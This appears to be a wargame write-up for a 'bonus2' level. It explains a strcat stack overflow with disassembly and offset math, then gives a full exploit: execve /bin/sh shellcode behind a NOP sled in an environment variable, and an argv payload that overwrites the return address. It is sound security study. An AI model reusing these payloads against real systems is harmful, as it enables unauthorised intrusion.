# Way to bonus3

## Core (3 lines)
- `greetuser` does `strcat(buf, argv)` joining the two args → return-address overwrite.
- The greeting string length depends on `LANG` (env), so **pad is variable**.
- argv is too small for shellcode → **plant it in env (`SC`)** and use a NOP sled to absorb the address error.

## Decisive disass
```
# main: copy both argv into a local buffer (esp+0x50) side by side
<+78>  call strncpy@plt        ; strncpy(esp+0x50,      argv[1], 0x28=40)  → may leave no NUL
<+113> call strncpy@plt        ; strncpy(esp+0x50+0x28, argv[2], 0x20=32)
<+125> call getenv@plt         ; getenv("LANG")         ; 0x8048738="LANG"
<+173> call memcmp@plt         ; LANG=="fi"? (0x804873d) → global=1
<+220> call memcmp@plt         ; LANG=="nl"? (0x8048740) → global=2
<+256> rep movsl               ; re-copy 76 bytes (0x13*4) of the buffer to esp → greetuser's ebp+8
<+258> call greetuser

# greetuser: pick greeting by global (1/2/0), then strcat
<+6>   sub $0x58,%esp
<+30>  lea -0x48(%ebp),%eax    ; buf = ebp-0x48
<+134> lea 0x8(%ebp),%eax ; mov %eax,0x4(%esp)  ; strcat arg2 = ebp+8 (the copied argv)
<+144> lea -0x48(%ebp) ; mov %eax,(%esp)        ; strcat arg1 = buf
<+147> call strcat@plt
<+158> call puts@plt
```
(Remaining branches / greeting copies: confirm with `disas`. Skipped — it's just the grind of choosing a greeting.)

## Mechanism (why it works)
1. **Two argv become one string**: in `strncpy(dst,argv[1],40)`, if `argv[1]` is exactly 40 bytes it leaves no NUL → inside the buffer the 40B of argv[1] run straight into argv[2].
2. **main→greetuser bridge**: right after `rep movsl` re-copies those 76 bytes to esp, main does `call`. So greetuser's `ebp+8` is my argv data. (greetuser reads it off its own new frame; main's allocation is irrelevant.)
3. **strcat overflows**: `strcat(buf=ebp-0x48, ebp+8)` appends my long data after the greeting, overrunning buf and overwriting the return address (ebp+4).
4. **env + sled**: argv[2] is capped at 32B, too small for shellcode(23B)+pad+addr → put the shellcode in `SC` env (top of stack, plenty of room). Aim the return address at the middle of the sled to absorb address error.

## Exploit

### offset
```
buf = ebp-0x48,  return addr = ebp+4         ; <greetuser+30> lea, + x86 call ABI (ret=ebp+4)
dist = 0x48 + 4 = 0x4C = 76                   ; fixed (compile-time stack layout)
pad  = 76 - greeting - argv[1](40)            ; variable (LANG changes greeting)
```

### greeting length (fixed by the copy byte counts in disass)
```
LANG=fi: "Hyvää päivää " = 18B   ; ä=UTF-8 2B×2, copies 19B (+54~+99) − NUL
LANG=nl: "Goedemiddag! " = 13B   ; copies 14B (+101~+133) − NUL
else    : "Hello " → global=0, different branch
```

### values (choosing LANG=nl)
```
pad = 76 - 13 - 40 = 23                       ; NB: the original "nl=23 bytes" is wrong — 23 is the pad, not the greeting
argv[1] = "A"*40                              ; forces no-NUL + occupies the 40B slot in strcat
SC env  = "\x90"*200 + shellcode(23B)         ; execve /bin/sh, shell-storm #575
target  = &SC + ~100 (sled middle)            ; measure &SC with getaddr, then aim at the middle
```

### address measurement (why a sled)
- `getaddr SC` → something like `0xbffffe5e`. **But it differs from the address under bonus2**: env stack position depends on `argv[0]` length (`/tmp/getaddr` ≠ `./bonus2`) → a shift of a few to tens of bytes.
- The 200-byte NOP sled absorbs exactly this **address error between the two binaries**. Land anywhere in the sled → slide down to the shellcode.

### payload / delivery (2 argv)
```bash
export LANG="nl"
export SC=$(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"')
vi /tmp/getaddr.c   # edit the getaddr source to print the env var
gcc -m32 -o /tmp/getaddr /tmp/getaddr.c
/tmp/getaddr SC          # measure &SC → compute the middle address
./bonus2 $(python -c 'print "A"*40') $(python -c 'print "A"*23 + "\xc2\xfe\xff\xbf"')
```

## Diff vs previous level (bonus1)
- **Win condition regresses**: bonus1 never touched the return address — it just overwrote a local to pass a cmp (integer overflow). bonus2 goes back to **return-address overwrite + shellcode** (the bonus0 family).
- **Unique axes**:
  1. overflow by `strcat` joining two argv (abusing strncpy's missing NUL)
  2. greeting is driven by **env (LANG)** → variable pad (first among the bonuses)
  3. shellcode planted in **env (SC)** instead of argv + the `argv[0]`-length **address shift** absorbed by a sled (first env-shellcode level)
- Offset derivation is the same as bonus0 (buf→return-addr distance). Measuring the address outside gdb is also the same idea as bonus0 (stack shift).

## Unverified / caveats
- Assumes ASLR off / NX off (fixed stack addresses). If either is on, this approach fails.
- `target addr` / `shellcode` / resulting `.pass` are per-environment measurements, so omitted (managed in .pass).
